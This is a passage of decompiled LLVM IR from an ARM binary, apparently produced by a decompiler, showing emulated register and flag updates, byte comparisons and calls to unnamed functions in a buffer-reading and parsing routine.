  %v2_9264 = sub i32 %v2_9258, %v3_9260
  %v3_9264 = icmp uge i32 %v2_9258, %v3_9260
  store i1 %v3_9264, i1* %cpsr_c.global-to-local, align 1
  %v4_9264 = xor i32 %v3_9260, %v2_9258
  %v5_9264 = xor i32 %v2_9264, %v2_9258
  %v6_9264 = and i32 %v5_9264, %v4_9264
  %v7_9264 = icmp slt i32 %v6_9264, 0
  store i1 %v7_9264, i1* %cpsr_v.global-to-local, align 1
  %v8_9264 = icmp slt i32 %v2_9264, 0
  store i1 %v8_9264, i1* %cpsr_n.global-to-local, align 1
  %v9_9264 = icmp eq i32 %v2_9258, %v3_9260
  store i1 %v9_9264, i1* %cpsr_z.global-to-local, align 1
  %v1_9268 = add i32 %v3_9260, 1
  store i32 %v1_9268, i32* %ip.global-to-local, align 4
  %v8_926c = icmp sgt i32 %v2_9258, %v3_9260
  %v0_9240 = load i32, i32* @r5, align 4
  %v2_9240 = add i32 %v0_9240, %v3_9260
  %v3_9240 = inttoptr i32 %v2_9240 to i8*
  %v4_9240 = load i8, i8* %v3_9240, align 1
  %v6_9240 = zext i8 %v4_9240 to i32
  store i32 %v6_9240, i32* %r3.global-to-local, align 4
  %v2_9244 = icmp ugt i8 %v4_9240, 60
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9244 = icmp ult i8 %v4_9240, 61
  store i1 %v6_9244, i1* %cpsr_n.global-to-local, align 1
  %v7_9244 = icmp eq i8 %v4_9240, 61
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_926c, label %dec_label_pc_9240, label %dec_label_pc_9270

dec_label_pc_9270:                                ; preds = %dec_label_pc_9254
  br i1 %v7_9244, label %dec_label_pc_9284, label %dec_label_pc_927c

dec_label_pc_927c:                                ; preds = %dec_label_pc_92c8, %dec_label_pc_92ec, %dec_label_pc_9270, %bb224
  %v0_927c = load i32, i32* @sl, align 4
  store i32 %v0_927c, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9284:                                ; preds = %dec_label_pc_9240, %dec_label_pc_9270
  %v0_9284 = load i32, i32* @r8, align 4
  %v1_9284 = add i32 %v0_9284, 12
  %v2_9284 = inttoptr i32 %v1_9284 to i32*
  %v3_9284 = load i32, i32* %v2_9284, align 4
  store i32 %v3_9284, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9290 = icmp slt i32 %v3_9284, 0
  store i1 %v1_9290, i1* %cpsr_n.global-to-local, align 1
  %v2_9290 = icmp eq i32 %v3_9284, 0
  store i1 %v2_9290, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp228 = icmp slt i32 %v3_9284, 1
  br i1 %tmp228, label %dec_label_pc_92ec, label %dec_label_pc_929c

dec_label_pc_929c:                                ; preds = %dec_label_pc_9284
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_92c8

dec_label_pc_92a4:                                ; preds = %dec_label_pc_92c8
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_92a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_92a8, i32* %r3.global-to-local, align 4
  %v0_92ac = load i32, i32* @r8, align 4
  %v1_92ac = add i32 %v0_92ac, 12
  %v2_92ac = inttoptr i32 %v1_92ac to i32*
  %v3_92ac = load i32, i32* %v2_92ac, align 4
  %v1_92b0 = add i32 %v3_92a8, 1
  store i32 %v1_92b0, i32* %ip.global-to-local, align 4
  %v2_92b4 = sub i32 %v3_92ac, %v1_92b0
  %v3_92b4 = icmp uge i32 %v3_92ac, %v1_92b0
  store i1 %v3_92b4, i1* %cpsr_c.global-to-local, align 1
  %v4_92b4 = xor i32 %v3_92ac, %v1_92b0
  %v5_92b4 = xor i32 %v2_92b4, %v3_92ac
  %v6_92b4 = and i32 %v5_92b4, %v4_92b4
  %v7_92b4 = icmp slt i32 %v6_92b4, 0
  store i1 %v7_92b4, i1* %cpsr_v.global-to-local, align 1
  %v8_92b4 = icmp slt i32 %v2_92b4, 0
  store i1 %v8_92b4, i1* %cpsr_n.global-to-local, align 1
  %v9_92b4 = icmp eq i32 %v3_92ac, %v1_92b0
  store i1 %v9_92b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_92b0, i32* %r1.global-to-local, align 4
  store i32 %v1_92b0, i32* %stack_var_-40, align 4
  %v7_92c4 = icmp sgt i32 %v3_92ac, %v1_92b0
  %v0_92d4.pre = load i32, i32* @r5, align 4
  br i1 %v7_92c4, label %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge, label %dec_label_pc_92ec

dec_label_pc_92a4.dec_label_pc_92c8_crit_edge:    ; preds = %dec_label_pc_92a4
  %v0_92d8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_92c8

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge, %dec_label_pc_929c
  %v0_92d8 = phi i32 [ %v0_92d8.pre, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ %v3_9260, %dec_label_pc_929c ]
  %v0_92d4 = phi i32 [ %v0_92d4.pre, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ %v0_9240, %dec_label_pc_929c ]
  %v0_92c8 = phi i32 [ %v1_92b0, %dec_label_pc_92a4.dec_label_pc_92c8_crit_edge ], [ 0, %dec_label_pc_929c ]
  %v1_92c8 = and i32 %v0_92c8, 33554432
  %v2_92c8 = icmp ne i32 %v1_92c8, 0
  store i1 %v2_92c8, i1* %cpsr_c.global-to-local, align 1
  %v3_92c8 = mul i32 %v0_92c8, 128
  %v1_92cc = add i32 %v3_92c8, 1472
  %v0_92d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_92d0 = add i32 %v1_92cc, %v0_92d0
  store i32 %v2_92d0, i32* %r1.global-to-local, align 4
  store i32 %v0_92d4, i32* %r0.global-to-local, align 4
  store i32 %v0_92d8, i32* %r2.global-to-local, align 4
  %v3_92dc = inttoptr i32 %v0_92d4 to i8*
  %v4_92dc = call i32 @function_12940(i8* %v3_92dc, i32 %v2_92d0, i32 %v0_92d8)
  store i32 %v4_92dc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_92e0 = icmp slt i32 %v4_92dc, 0
  store i1 %v1_92e0, i1* %cpsr_n.global-to-local, align 1
  %v2_92e0 = icmp eq i32 %v4_92dc, 0
  store i1 %v2_92e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_92e0, label %dec_label_pc_92a4, label %dec_label_pc_927c

dec_label_pc_92ec:                                ; preds = %dec_label_pc_92a4, %dec_label_pc_9284
  %v0_92ec = phi i32 [ %v0_9240, %dec_label_pc_9284 ], [ %v0_92d4.pre, %dec_label_pc_92a4 ]
  store i32 %v0_92ec, i32* %r0.global-to-local, align 4
  %v1_92f0 = inttoptr i32 %v0_92ec to i8*
  %v2_92f0 = call i32 @function_124dc(i8* %v1_92f0)
  store i32 %v2_92f0, i32* %r0.global-to-local, align 4
  %v1_92f4 = add i32 %v2_92f0, -127
  %v2_92f4 = icmp ugt i32 %v2_92f0, 126
  store i1 %v2_92f4, i1* %cpsr_c.global-to-local, align 1
  %v3_92f4 = sub i32 126, %v2_92f0
  %v4_92f4 = and i32 %v3_92f4, %v2_92f0
  %v5_92f4 = icmp slt i32 %v4_92f4, 0
  store i1 %v5_92f4, i1* %cpsr_v.global-to-local, align 1
  %v6_92f4 = icmp slt i32 %v1_92f4, 0
  store i1 %v6_92f4, i1* %cpsr_n.global-to-local, align 1
  %v7_92f4 = icmp eq i32 %v2_92f0, 127
  store i1 %v7_92f4, i1* %cpsr_z.global-to-local, align 1
  %v8_92f8 = icmp sgt i32 %v2_92f0, 127
  br i1 %v8_92f8, label %dec_label_pc_927c, label %dec_label_pc_92fc

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v0_92fc = load i32, i32* @r8, align 4
  %v1_92fc = add i32 %v0_92fc, 12
  %v2_92fc = inttoptr i32 %v1_92fc to i32*
  %v3_92fc = load i32, i32* %v2_92fc, align 4
  %v1_9300 = and i32 %v3_92fc, 33554432
  %v2_9300 = icmp ne i32 %v1_9300, 0
  store i1 %v2_9300, i1* %cpsr_c.global-to-local, align 1
  %v3_9300 = mul i32 %v3_92fc, 128
  %v1_9304 = add i32 %v3_9300, 1472
  %v0_9308 = load i32, i32* @r5, align 4
  store i32 %v0_9308, i32* %r1.global-to-local, align 4
  %v0_930c = load i32, i32* %sb.global-to-local, align 4
  %v2_930c = add i32 %v1_9304, %v0_930c
  store i32 %v2_930c, i32* @r0, align 4
  %v2_9310 = inttoptr i32 %v2_930c to i8*
  %v3_9310 = call i32 @function_12504(i8* %v2_9310, i32 %v0_9308)
  store i32 %v3_9310, i32* %r0.global-to-local, align 4
  %v0_9314 = load i32, i32* @r8, align 4
  %v1_9314 = add i32 %v0_9314, 12
  %v2_9314 = inttoptr i32 %v1_9314 to i32*
  %v3_9314 = load i32, i32* %v2_9314, align 4
  %v0_9318 = load i32, i32* @sl, align 4
  store i32 %v0_9318, i32* @r5, align 4
  %v1_931c = add i32 %v3_9314, 1
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  store i32 %v1_931c, i32* %v2_9314, align 4
  %v1_9134.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9328:                                ; preds = %dec_label_pc_915c, %dec_label_pc_9128
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9330 = call i32 @function_11b24(i32 38, i32* null)
  %v0_9334 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9334, i32* @r1, align 4
  store i32 %v3_9330, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9340 = call i32 @function_12830(i8* %tmp199, i32 %v0_9334, i32 %v3_9330)
  store i32 %v4_9340, i32* %r0.global-to-local, align 4
  %v1_9344 = add i32 %v4_9340, 1
  %v2_9344 = icmp eq i32 %v4_9340, -1
  store i1 %v2_9344, i1* %cpsr_c.global-to-local, align 1
  %v3_9344 = sub i32 0, %v4_9340
  %v4_9344 = and i32 %v1_9344, %v3_9344
  %v5_9344 = icmp slt i32 %v4_9344, 0
  store i1 %v5_9344, i1* %cpsr_v.global-to-local, align 1
  %v6_9344 = icmp slt i32 %v1_9344, 0
  store i1 %v6_9344, i1* %cpsr_n.global-to-local, align 1
  %v7_9344 = icmp eq i32 %v1_9344, 0
  store i1 %v7_9344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9344, label %dec_label_pc_9678, label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %dec_label_pc_9328
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9354 = call i32 @function_11b24(i32 38, i32* null)
  %v0_9358 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9358, i32* @r1, align 4
  store i32 %v3_9354, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9364 = call i32 @function_12830(i8* %tmp199, i32 %v0_9358, i32 %v3_9354)
  store i32 %v4_9364, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_9370 = add i32 %v4_9364, %v2_8748
  store i32 %v2_9370, i32* %r3.global-to-local, align 4
  %v1_9374 = load i32, i32* @r6, align 4
  %v2_9374 = add i32 %v1_9374, %v2_9370
  %v3_9374 = inttoptr i32 %v2_9374 to i8*
  %v4_9374 = load i8, i8* %v3_9374, align 1
  store i32 %v2_8280, i32* %lr.global-to-local, align 4
  %v2_937c = icmp ugt i8 %v4_9374, 31
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_937c = icmp ult i8 %v4_9374, 32
  store i1 %v6_937c, i1* %cpsr_n.global-to-local, align 1
  %v7_937c = icmp eq i8 %v4_9374, 32
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  %v2_9384 = zext i1 %v7_937c to i32
  %v2_9384.v4_9364 = add i32 %v2_9384, %v4_9364
  store i32 %v2_9384.v4_9364, i32* @r4, align 4
  %v2_9388 = add i32 %v2_9384.v4_9364, %v2_8280
  store i32 %v2_9388, i32* @r5, align 4
  store i32 %v2_9388, i32* %r0.global-to-local, align 4
  %v1_9390 = load i32, i32* %fp.global-to-local, align 4
  %v2_9390 = sub i32 %v1_9390, %v2_9384.v4_9364
  store i32 %v2_9390, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_939c = call i32 @function_125a0(i32 %v2_9388, i32 %v2_9390, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32 2)
  store i32 %v5_939c, i32* %r0.global-to-local, align 4
  %v1_93a0 = add i32 %v5_939c, 1
  %v2_93a0 = icmp eq i32 %v5_939c, -1
  store i1 %v2_93a0, i1* %cpsr_c.global-to-local, align 1
  %v3_93a0 = sub i32 0, %v5_939c
  %v4_93a0 = and i32 %v1_93a0, %v3_93a0
  %v5_93a0 = icmp slt i32 %v4_93a0, 0
  store i1 %v5_93a0, i1* %cpsr_v.global-to-local, align 1
  %v6_93a0 = icmp slt i32 %v1_93a0, 0
  store i1 %v6_93a0, i1* %cpsr_n.global-to-local, align 1
  %v7_93a0 = icmp eq i32 %v1_93a0, 0
  store i1 %v7_93a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_939c, i32* %lr.global-to-local, align 4
  br i1 %v7_93a0, label %dec_label_pc_9678, label %dec_label_pc_93ac

dec_label_pc_93ac:                                ; preds = %dec_label_pc_934c
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v1_93b4 = add i32 %v5_939c, -1
  %v2_93b4 = icmp ne i32 %v5_939c, 0
  store i1 %v2_93b4, i1* %cpsr_c.global-to-local, align 1
  %v3_93b4 = sub i32 0, %v5_939c
  %v4_93b4 = and i32 %v5_939c, %v3_93b4
  %v5_93b4 = icmp slt i32 %v4_93b4, 0
  store i1 %v5_93b4, i1* %cpsr_v.global-to-local, align 1
  %v6_93b4 = icmp slt i32 %v1_93b4, 0
  store i1 %v6_93b4, i1* %cpsr_n.global-to-local, align 1
  %v7_93b4 = icmp eq i32 %v5_939c, 1
  store i1 %v7_93b4, i1* %cpsr_z.global-to-local, align 1
  %v1_93b8 = load i32, i32* @r4, align 4
  %v2_93b8 = add i32 %v1_93b8, %v2_8748
  store i32 %v2_93b8, i32* %ip.global-to-local, align 4
  %v7_93bc = icmp sgt i32 %v5_939c, 1
  br i1 %v7_93bc, label %bb229, label %bb230

bb229:                                            ; preds = %dec_label_pc_93ac
  %v9_93bc = add i32 %v5_939c, -2
  store i32 %v9_93bc, i32* %lr.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %dec_label_pc_93ac, %bb229
  %v3_93e0 = phi i32 [ %v5_939c, %dec_label_pc_93ac ], [ %v9_93bc, %bb229 ]
  %v1_93c4 = add i32 %v3_93e0, 1
  store i32 %v1_93c4, i32* %r6.global-to-local, align 4
  %v1_93c8 = add i32 %v2_93b8, -20773
  store i32 %v1_93c8, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_93d0 = load i32, i32* @r5, align 4
  store i32 %v0_93d0, i32* %r0.global-to-local, align 4
  store i32 %v1_93c4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15780.44 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_93e0 = add i32 %v3_93e0, %v1_93c8
  %v5_93e0 = inttoptr i32 %v4_93e0 to i8*
  store i8 0, i8* %v5_93e0, align 1
  %v5_93e4 = call i32 @function_125a0(i32 %v0_93d0, i32 %v1_93c4, i32 ptrtoint ([5 x i8]* @global_var_15780.44 to i32), i32 4)
  store i32 %v5_93e4, i32* %r0.global-to-local, align 4
  %v1_93e8 = add i32 %v5_93e4, -4
  %v2_93e8 = icmp ugt i32 %v5_93e4, 3
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v3_93e8 = sub i32 3, %v5_93e4
  %v4_93e8 = and i32 %v3_93e8, %v5_93e4
  %v5_93e8 = icmp slt i32 %v4_93e8, 0
  store i1 %v5_93e8, i1* %cpsr_v.global-to-local, align 1
  %v6_93e8 = icmp slt i32 %v1_93e8, 0
  store i1 %v6_93e8, i1* %cpsr_n.global-to-local, align 1
  %v7_93e8 = icmp eq i32 %v5_93e4, 4
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93e8, label %dec_label_pc_9960, label %dec_label_pc_93f0

dec_label_pc_93f0:                                ; preds = %bb230
  store i32 %v2_8280, i32* %ip.global-to-local, align 4
  %v1_93f4 = load i32, i32* @r4, align 4
  %v2_93f4 = add i32 %v1_93f4, %v2_8280
  %v3_93f4 = inttoptr i32 %v2_93f4 to i8*
  %v4_93f4 = load i8, i8* %v3_93f4, align 1
  %v6_93f4 = zext i8 %v4_93f4 to i32
  store i32 %v6_93f4, i32* %r3.global-to-local, align 4
  %v2_93f8 = icmp ugt i8 %v4_93f4, 46
  store i1 %v2_93f8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_93f8 = icmp ult i8 %v4_93f4, 47
  store i1 %v6_93f8, i1* %cpsr_n.global-to-local, align 1
  %v7_93f8 = icmp eq i8 %v4_93f4, 47
  store i1 %v7_93f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93f8, label %dec_label_pc_9b54, label %dec_label_pc_9400

dec_label_pc_9400:                                ; preds = %dec_label_pc_94ac, %dec_label_pc_9a98, %dec_label_pc_9b84, %dec_label_pc_9b54, %dec_label_pc_9a30, %dec_label_pc_9a14, %dec_label_pc_93f0, %dec_label_pc_9ba0, %dec_label_pc_9a60
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9404 = load i32, i32* @r8, align 4
  %v3_9404 = add i32 %v2_9404, -1452
  %v4_9404 = inttoptr i32 %v3_9404 to i8*
  store i8 1, i8* %v4_9404, align 1
  br label %dec_label_pc_8838

dec_label_pc_940c:                                ; preds = %dec_label_pc_8828
  %v0_940c = call i32 @function_13470()
  store i32 %v0_940c, i32* %r0.global-to-local, align 4
  %v0_9410 = load i32, i32* %sb.global-to-local, align 4
  %v1_9410 = add i32 %v0_9410, 1472
  store i32 %v1_9410, i32* %r3.global-to-local, align 4
  %v0_9418 = load i32, i32* @r8, align 4
  %v1_9418 = add i32 %v0_9418, 656
  %v2_9418 = inttoptr i32 %v1_9418 to i32*
  %v3_9418 = load i32, i32* %v2_9418, align 4
  store i32 %v3_9418, i32* %r3.global-to-local, align 4
  %v1_9420 = add i32 %v3_9418, -1024
  %v2_9420 = icmp ugt i32 %v3_9418, 1023
  store i1 %v2_9420, i1* %cpsr_c.global-to-local, align 1
  %v3_9420 = sub i32 1023, %v3_9418
  %v4_9420 = and i32 %v3_9420, %v3_9418
  %v5_9420 = icmp slt i32 %v4_9420, 0
  store i1 %v5_9420, i1* %cpsr_v.global-to-local, align 1
  %v6_9420 = icmp slt i32 %v1_9420, 0
  store i1 %v6_9420, i1* %cpsr_n.global-to-local, align 1
  %v7_9420 = icmp eq i32 %v3_9418, 1024
  store i1 %v7_9420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_940c, i32* %fp.global-to-local, align 4
  %v1_9428 = add i32 %v0_9410, 2116
  store i32 %v1_9428, i32* @r7, align 4
  br i1 %v7_9420, label %dec_label_pc_9528, label %dec_label_pc_9430

dec_label_pc_9430:                                ; preds = %dec_label_pc_940c, %dec_label_pc_9528, %dec_label_pc_951c
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_9434 = load i32, i32* %fp.global-to-local, align 4
  %v2_9434 = inttoptr i32 %v1_9434 to i32*
  store i32 0, i32* %v2_9434, align 4
  %v0_9438 = load i32, i32* @r8, align 4
  %v1_9438 = add i32 %v0_9438, 656
  %v2_9438 = inttoptr i32 %v1_9438 to i32*
  %v3_9438 = load i32, i32* %v2_9438, align 4
  store i32 %v3_9438, i32* %r1.global-to-local, align 4
  %v1_943c = add i32 %v0_9438, -1456
  %v2_943c = inttoptr i32 %v1_943c to i32*
  %v3_943c = load i32, i32* %v2_943c, align 4
  store i32 %v3_943c, i32* %r0.global-to-local, align 4
  %v1_9440 = sub i32 1024, %v3_9438
  store i32 %v1_9440, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9448 = load i32, i32* @r7, align 4
  %v2_9448 = add i32 %v0_9448, %v3_9438
  store i32 %v2_9448, i32* %r1.global-to-local, align 4
  %v4_944c = inttoptr i32 %v2_9448 to i32*
  %v5_944c = call i32 @function_136a0(i32 %v3_943c, i32* %v4_944c, i32 %v1_9440, i32 16384)
  store i32 %v5_944c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9450 = icmp slt i32 %v5_944c, 0
  store i1 %v1_9450, i1* %cpsr_n.global-to-local, align 1
  %v2_9450 = icmp eq i32 %v5_944c, 0
  store i1 %v2_9450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9450, label %dec_label_pc_992c, label %dec_label_pc_9458

dec_label_pc_9458:                                ; preds = %dec_label_pc_9430
  %v1_9458 = add i32 %v5_944c, 1
  %v2_9458 = icmp eq i32 %v5_944c, -1
  store i1 %v2_9458, i1* %cpsr_c.global-to-local, align 1
  %v3_9458 = sub i32 0, %v5_944c
  %v4_9458 = and i32 %v1_9458, %v3_9458
  %v5_9458 = icmp slt i32 %v4_9458, 0
  store i1 %v5_9458, i1* %cpsr_v.global-to-local, align 1
  %v6_9458 = icmp slt i32 %v1_9458, 0
  store i1 %v6_9458, i1* %cpsr_n.global-to-local, align 1
  %v7_9458 = icmp eq i32 %v1_9458, 0
  store i1 %v7_9458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9458, label %dec_label_pc_9950, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9458
  %v0_9460 = load i32, i32* @r8, align 4
  %v1_9460 = add i32 %v0_9460, 656
  %v2_9460 = inttoptr i32 %v1_9460 to i32*
  %v3_9460 = load i32, i32* %v2_9460, align 4
  store i32 %v2_87d8, i32* %r1.global-to-local, align 4
  %v2_9468 = add i32 %v3_9460, %v5_944c
  store i32 %v2_9468, i32* @r4, align 4
  store i32 %v2_9468, i32* %v2_9460, align 4
  %v0_9470 = load i32, i32* %r1.global-to-local, align 4
  %v1_9470 = load i32, i32* @r8, align 4
  %v2_9470 = add i32 %v1_9470, -1448
  %v3_9470 = inttoptr i32 %v2_9470 to i32*
  store i32 %v0_9470, i32* %v3_9470, align 4
  br label %dec_label_pc_94fc

dec_label_pc_9478:                                ; preds = %dec_label_pc_94fc
  %v1_9478 = add i32 %v0_94fc, -4
  %v2_9478 = inttoptr i32 %v1_9478 to i32*
  %v3_9478 = load i32, i32* %v2_9478, align 4
  store i32 %v3_9478, i32* @sl, align 4
  %v1_947c = load i32, i32* @r4, align 4
  %v5_9480 = icmp slt i32 %v3_94fc, %v1_947c
  %storemerge73 = select i1 %v5_9480, i32 %v3_94fc, i32 %v1_947c
  store i32 %storemerge73, i32* @r5, align 4
  %v2_9488 = sub i32 %v3_94fc, %storemerge73
  store i32 %v2_9488, i32* @r6, align 4
  %v1_948c = add i32 %v3_9478, -1
  %v2_948c = icmp ne i32 %v3_9478, 0
  store i1 %v2_948c, i1* %cpsr_c.global-to-local, align 1
  %v3_948c = sub i32 0, %v3_9478
  %v4_948c = and i32 %v3_9478, %v3_948c
  %v5_948c = icmp slt i32 %v4_948c, 0
  store i1 %v5_948c, i1* %cpsr_v.global-to-local, align 1
  %v6_948c = icmp slt i32 %v1_948c, 0
  store i1 %v6_948c, i1* %cpsr_n.global-to-local, align 1
  %v7_948c = icmp eq i32 %v3_9478, 1
  store i1 %v7_948c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9488, i32* %v2_94fc, align 4
  br i1 %v7_948c, label %dec_label_pc_9548, label %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge

dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge: ; preds = %dec_label_pc_9478
  %v0_9498.pr.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9498

dec_label_pc_9498:                                ; preds = %dec_label_pc_9508, %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge, %dec_label_pc_9570
  %v0_9498 = phi i32 [ %v3_9570, %dec_label_pc_9570 ], [ %v0_9498.pr.pre, %dec_label_pc_9478.dec_label_pc_9498thread-pre-split_crit_edge ], [ %v3_94fc, %dec_label_pc_9508 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9498 = icmp slt i32 %v0_9498, 0
  store i1 %v1_9498, i1* %cpsr_n.global-to-local, align 1
  %v2_9498 = icmp eq i32 %v0_9498, 0
  store i1 %v2_9498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9498, label %dec_label_pc_94a0, label %dec_label_pc_94c0

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9498
  %v0_94a0 = load i32, i32* @r8, align 4
  %v1_94a0 = add i32 %v0_94a0, 4
  %v2_94a0 = inttoptr i32 %v1_94a0 to i32*
  %v3_94a0 = load i32, i32* %v2_94a0, align 4
  store i32 %v3_94a0, i32* @r4, align 4
  %v1_94a4 = add i32 %v3_94a0, -1
  %v2_94a4 = icmp ne i32 %v3_94a0, 0
  store i1 %v2_94a4, i1* %cpsr_c.global-to-local, align 1
  %v3_94a4 = sub i32 0, %v3_94a0
  %v4_94a4 = and i32 %v3_94a0, %v3_94a4
  %v5_94a4 = icmp slt i32 %v4_94a4, 0
  store i1 %v5_94a4, i1* %cpsr_v.global-to-local, align 1
  %v6_94a4 = icmp slt i32 %v1_94a4, 0
  store i1 %v6_94a4, i1* %cpsr_n.global-to-local, align 1
  %v7_94a4 = icmp eq i32 %v3_94a0, 1
  store i1 %v7_94a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94a4, label %dec_label_pc_9578, label %dec_label_pc_94ac

dec_label_pc_94ac:                                ; preds = %dec_label_pc_94a0
  %v1_94ac = add i32 %v0_94a0, 656
  %v2_94ac = inttoptr i32 %v1_94ac to i32*
  %v3_94ac = load i32, i32* %v2_94ac, align 4
  %v0_94b0 = load i32, i32* @r5, align 4
  %v2_94b0 = sub i32 %v3_94ac, %v0_94b0
  store i32 %v2_94b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94b4 = icmp slt i32 %v2_94b0, 0
  store i1 %v1_94b4, i1* %cpsr_n.global-to-local, align 1
  %v2_94b4 = icmp eq i32 %v2_94b0, 0
  store i1 %v2_94b4, i1* %cpsr_z.global-to-local, align 1
  %v2_94b8 = add i32 %v0_94a0, 8
  %v3_94b8 = inttoptr i32 %v2_94b8 to i32*
  store i32 %v2_94b0, i32* %v3_94b8, align 4
  br i1 %v2_94b4, label %dec_label_pc_9400, label %dec_label_pc_94c0

dec_label_pc_94c0:                                ; preds = %dec_label_pc_9498, %dec_label_pc_9578, %dec_label_pc_94ac, %dec_label_pc_9600
  %v0_94c0 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94c0 = icmp slt i32 %v0_94c0, 0
  store i1 %v1_94c0, i1* %cpsr_n.global-to-local, align 1
  %v2_94c0 = icmp eq i32 %v0_94c0, 0
  store i1 %v2_94c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94c0, label %dec_label_pc_9510, label %dec_label_pc_94c8

dec_label_pc_94c8:                                ; preds = %dec_label_pc_94c0
  %v0_94c8 = load i32, i32* @r8, align 4
  %v1_94c8 = add i32 %v0_94c8, 656
  %v2_94c8 = inttoptr i32 %v1_94c8 to i32*
  %v3_94c8 = load i32, i32* %v2_94c8, align 4
  store i32 %v3_94c8, i32* %r3.global-to-local, align 4
  %v2_94cc = sub i32 %v3_94c8, %v0_94c0
  store i32 %v2_94cc, i32* @r4, align 4
  store i32 %v2_94cc, i32* @r2, align 4
  store i32 %v2_94cc, i32* %v2_94c8, align 4
  %v0_94d8 = load i32, i32* @r7, align 4
  %v1_94d8 = load i32, i32* @r5, align 4
  %v2_94d8 = add i32 %v1_94d8, %v0_94d8
  store i32 %v2_94d8, i32* @r1, align 4
  store i32 %v0_94d8, i32* @r0, align 4
  %v3_94e0 = call i32 @function_134c0(i32 %v0_94d8, i32 %v2_94d8, i32 %v2_94cc)
  store i32 %v3_94e0, i32* %r0.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r8, align 4
  %v1_94e4 = add i32 %v0_94e4, 656
  %v2_94e4 = inttoptr i32 %v1_94e4 to i32*
  %v3_94e4 = load i32, i32* %v2_94e4, align 4
